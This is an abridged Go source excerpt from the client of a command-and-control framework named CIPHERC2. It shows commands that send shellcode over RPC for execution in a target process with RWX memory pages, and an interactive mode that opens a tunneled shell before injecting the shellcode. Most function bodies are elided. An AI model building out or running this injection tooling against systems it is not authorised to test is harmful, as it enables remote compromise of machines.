...
func ExecuteShellcodeCmd(cmd *cobra.Command, con *console.CIPHERC2Client, args []string) {
	...
	shellcodeTask, err := con.Rpc.Task(context.Background(), &CIPHERC2pb.TaskReq{
		Data:     shellcodeBin,
		RWXPages: rwxPages,
		Pid:      pid,
...
func PrintExecuteShellcode(task *CIPHERC2pb.Task, con *console.CIPHERC2Client) {
...
func executeInteractive(cmd *cobra.Command, hostProc string, shellcode []byte, rwxPages bool, con *console.CIPHERC2Client) {
	...
	rpcTunnel, err := con.Rpc.CreateTunnel(context.Background(), &CIPHERC2pb.Tunnel{
	...
	shell, err := con.Rpc.Shell(context.Background(), &CIPHERC2pb.ShellReq{
		Request:   con.ActiveTarget.Request(cmd),
		Path:      hostProc,
		EnablePTY: !noPty,
		TunnelID:  tunnel.ID,
	...
	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
	con.SpinUntil(msg, ctrl)
	_, err = con.Rpc.Task(context.Background(), &CIPHERC2pb.TaskReq{
		Request:  con.ActiveTarget.Request(cmd),
		Pid:      pid,
		Data:     shellcode,
		RWXPages: rwxPages,
